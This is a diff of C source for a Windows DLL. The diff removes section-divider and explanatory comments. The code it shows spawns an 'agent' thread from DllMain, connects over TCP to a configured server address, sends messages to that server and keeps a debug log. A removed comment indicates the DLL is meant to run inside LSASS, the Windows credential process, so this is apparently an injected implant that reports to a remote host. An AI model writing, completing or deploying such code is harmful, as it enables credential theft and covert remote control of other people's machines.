@@ -55,7 +55,6 @@ static const char* BLACKLIST[] = {
 
 static SOCKET g_sock = INVALID_SOCKET;
 
-// ─── debug logger ────────────────────────────────────────────────────────────
 void debug_log(const char* fmt, ...) {
     FILE* f = fopen(DEBUG_LOG, "a");
     if (!f) return;                     // if even this fails, you have bigger problems
@@ -75,7 +74,6 @@ void debug_log(const char* fmt, ...) {
     fclose(f);
 }
 
-// ─── connect ─────────────────────────────────────────────────────────────────
 SOCKET connect_to_server() {
     SOCKET sock;
     struct sockaddr_in addr;
@@ -92,7 +90,6 @@ SOCKET connect_to_server() {
     addr.sin_family = AF_INET;
     addr.sin_port   = htons(SERVER_PORT);
 
-    // inet_addr is deprecated — use InetPtonA so we see parse errors
     int pton_ret = InetPtonA(AF_INET, SERVER_IP, &addr.sin_addr);
     debug_log("connect_to_server: InetPtonA(\"%s\") returned %d", SERVER_IP, pton_ret);
     if (pton_ret != 1) {
@@ -112,7 +109,6 @@ SOCKET connect_to_server() {
     return sock;
 }
 
-// ─── recv thread ─────────────────────────────────────────────────────────────
 DWORD WINAPI recv_thread(LPVOID lpParam) {
     char buf[4096];
     int n;
@@ -129,7 +125,6 @@ DWORD WINAPI recv_thread(LPVOID lpParam) {
     return 0;
 }
 
-// ─── send to server ──────────────────────────────────────────────────────────
 void log_to_server(const char* msg) {
     if (g_sock != INVALID_SOCKET) {
         int ret = send(g_sock, msg, (int)strlen(msg), 0);
@@ -139,7 +134,6 @@ void log_to_server(const char* msg) {
     }
 }
 
-// ─── agent thread ────────────────────────────────────────────────────────────
 DWORD WINAPI agent_thread(LPVOID lpParam) {
     debug_log("agent_thread: started (TID=%lu)", GetCurrentThreadId());
 
@@ -183,11 +177,8 @@ DWORD WINAPI agent_thread(LPVOID lpParam) {
     return 0;
 }
 
-// ─── DllMain ─────────────────────────────────────────────────────────────────
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        // Write this immediately — before the thread even spawns
-        // If you don't see this in the log, LSASS never even hit DllMain
         debug_log("DllMain: DLL_PROCESS_ATTACH fired (PID=%lu)", GetCurrentProcessId());
 
         HANDLE h = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL);
